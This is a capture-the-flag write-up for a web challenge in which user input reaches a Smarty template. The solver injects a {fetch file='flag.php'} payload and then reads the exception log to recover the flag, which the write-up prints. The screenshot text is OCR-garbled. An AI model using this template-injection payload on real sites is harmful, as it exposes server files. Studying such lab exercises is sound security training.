# boze
> How smart and capable is the smarty lib?

## About the Challenge
We were given a website that using smarty template to render our input, here is the preview of the source code


[Image extracted text: Not Secure
35.198.135.192.30326
<?php
require_once
vendor/ smarty/smarty/libs/Smarty.class.php "
;
if
isset($_GET [ 'content' ]) )
ssourceCode
file_get_contents(_FILE_);
echo
<pre>
htmlspecialchars( $sourceCode)
'<lpre>
exit;
}
When you
think you
own
this
but
these
comments
are
worth
even
more
ScompileDir
/tmp/smarty_compile/ '
%
if
(!is_dir(scompileDir) )
{
mkdir(scompileDir,
0755,
true) ;
ssmarty
new
Smarty() ;
ssmarty->display ( $_GET [ 'content' ]) ;
I [
ssmarty->setCompileDir(scompileDir)
}
catch
(Exception
Se)
{
echo
Still here?
SexceptionDetails
"Exception
File:
se->getMessage( )
"In" ;
stempFilePath
1
'tmp/sma
exception. log
file_put_contents(stempFilePath,
SexceptionDetails,
FILE_APPEND ) ;
}
2>
try
rty_]


It first checks if a `content` parameter is set in the GET request. If not, it displays the source code of the script. If the `content` parameter is set, it creates a new Smarty object and tries to display the content specified in the `content` parameter. If an exception occurs, it echoes `Still here?` and logs the exception details to a file. The source code is vulnerable to SSTI. We need to input the payload in the `content` parameter and then check the log file to see the output.

## How to Solve?
At first I tried to input every payload which is on `Hacktricks`, but I failed -_- 


[Image extracted text: ]


And then I tried to read the smarty documentation and I found the `fetch` class method. This function is used to retrieve a resource from a URL. And I inputted in the `content` parameter

```
{fetch file='flag.php'}
```


[Image extracted text: GET
/?content-{fetchs2ofile=
php '|
HTTP/1.1
HTTP/1.1
200
OK
2
Host:
35.198
135.192:30326
2
Date:
Sun,
22
Oct
2023
10:20
38
GMT
3
Cache-Control:
max-age-0
3
Server:
Apache
Upgrade-Insecure-Requests:
Content-Length:
11
5
User-Agent:
Mozilla/5.0
(Windows
NT
10.0;
Win64;
X64)
5
Connection:
close
AppleWebKit/537.36  (KHTML,
like
Gecko)
Chrome/118 . 0
5993. 88
6 Content-Type:
text/html;
charset-UTF-8
Safari/537.36
Accept:
8
Still
here?
text/html,application/xhtml+xml,application/xml;q-0.9,image/avif ,
image/webp, image/apng, */*;q-0.8,application/signed-exchange;v=b3;
q=0.7
Accept-Encoding
gzip,
deflate,
br
8 Accept-Language
en-US, en;q=0.9
9
Connection:
close
10
11
flag.]


And then check `/tmp/smarty_exception.log` file to obtain the flag


[Image extracted text: 6ET
/?content=
tmp_
smarty_
exception.
HTTP/1.1
HTTP/1.1
200
OK
2
Host:
35.198
135.192:30326
2
Date:
Sun,
22
Oct
2023
10:19:20
GMT
3
Cache-Control:
max-age-0
3
Server:
Apache
Upgrade-Insecure-Requests
Accept-Encoding
5
User-Agent
Mozilla/5 .0
(Windows
NT
10.0;
Win64;
X64)
5 Content-Length:
238
AppleWebKit/537
36
(KHTML ,
like
Gecko)
Chrome/118.0.5993.88
6
Connection:
close
Safari/537.36
Content-Type
text/html;
charset-UTF-8
Accept
8
text/html,application/xhtml+xml,application/xml;q-0.9, image/avif_
Exception
File:
Unable
to
Zoad
template
file:<
?php
image/webp, image/apng,*/*;q-0.8,application/signed-exchange;v=b3;
10
q=0 _
11 $flag_4f3qdw
Accept-Encoding
gzip,
deflate
br
ctf{72874605748965cbd4350a538edgabbfb20fbc47a8443addcd5c4adfd57dc
Accept-Language:
en-US, en;q=0.9
a79}"
Connection:
close
12
10
13
2>
11
14
15
Just
when
you
think
you
ve
seen
it
all,
this
person
is
really
pushing
the
boundaries
dD
16
log
Vary =]


```
ctf{72874605748965cbd4350a538e09abbfb20fbc47a8443addcd5c4adfd57dca79}
```